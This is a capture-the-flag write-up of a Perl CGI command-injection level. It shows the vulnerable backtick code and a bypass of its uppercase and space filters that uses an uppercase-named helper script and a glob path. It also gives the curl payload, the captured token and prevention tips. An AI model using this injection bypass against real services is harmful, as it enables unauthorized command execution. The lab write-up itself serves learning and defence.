# Level 12 - Perl CGI with Uppercase Filter Bypass

## Objective
Bypass input filtering to inject commands into a Perl CGI script.

## My Notes

Found another CGI script:
```bash
cat level12.pl
```

```perl
sub t {
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;     # Convert to UPPERCASE!
  $xx =~ s/\s.*//;         # Remove everything after first space
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
}
```

The parameter goes into backticks (command injection), but there are filters: converts lowercase to uppercase, removes spaces.

If I try `$(getflag)`, it becomes `$(GETFLAG)` which fails - shell commands are case-sensitive. Need to create my own script with an uppercase name:

```bash
echo '#!/bin/bash' > /tmp/GETFLAG
echo 'getflag > /tmp/flag12' >> /tmp/GETFLAG
chmod +x /tmp/GETFLAG
```

But `/tmp/GETFLAG` has lowercase in the path - `/tmp/` becomes `/TMP/` which doesn't exist. Solution: use shell globbing with wildcards. Wildcards like `*` are NOT affected by `tr/a-z/A-Z/`.

Payload: `` `/*/GETFLAG` ``

After uppercase conversion it stays the same (no lowercase to convert), and shell expands `/*` to match `/tmp` (among others).

```bash
curl "http://127.0.0.1:4646/level12.pl?x=%60/*/GETFLAG%60"
cat /tmp/flag12
```

Token: `g1qKMiRpXf53AWhDaU7FEkczr`

## Key Takeaways

**Input filter bypass:** When applications filter input, look for what characters ARE allowed, alternative representations, encoding tricks, logic flaws in filter order.

**Perl tr/// operator:** Only affects specified character ranges (a-z). Leaves uppercase, numbers, symbols unchanged. `*`, `/`, backticks are not modified.

**Shell globbing:** Wildcards like `*` match any characters. `/*/GETFLAG` expands to `/tmp/GETFLAG`, `/var/GETFLAG`, etc.

**Filter analysis:** The uppercase conversion only affects lowercase letters, and space removal only affects spaces. Wildcards and backticks pass through unchanged.

## Tools Used
- `echo`, `chmod` - Create exploit script
- `curl` - Send HTTP request

## Prevention
- Don't use backticks/system() with user input
- Whitelist, don't blacklist
- Quote properly with quotemeta()
- Avoid shell entirely - use native Perl functions
- Filter AFTER normalization, apply strict whitelist
